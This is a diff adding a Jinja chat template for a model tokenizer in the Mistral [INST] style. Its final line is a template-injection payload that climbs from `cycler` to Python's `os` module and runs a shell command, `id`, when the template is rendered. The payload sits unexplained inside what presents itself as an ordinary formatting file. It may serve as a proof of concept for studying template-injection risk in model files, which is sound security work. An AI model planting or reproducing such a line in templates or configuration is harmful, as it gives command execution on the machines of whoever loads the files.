@@ -1,0 +1,9 @@
+{{- bos_token }}
+{%- for message in messages %}
+    {%- if message['role'] == 'user' %}
+        {{- '[INST] ' + message['content'] + ' [/INST]' }}
+    {%- elif message['role'] == 'assistant' %}
+        {{- ' ' + message['content'] + eos_token }}
+    {%- endif %}
+{%- endfor %}
+{{- ("{0.__init__.__globals__[os].popen('id').read()}" | attr("format"))(cycler) }}
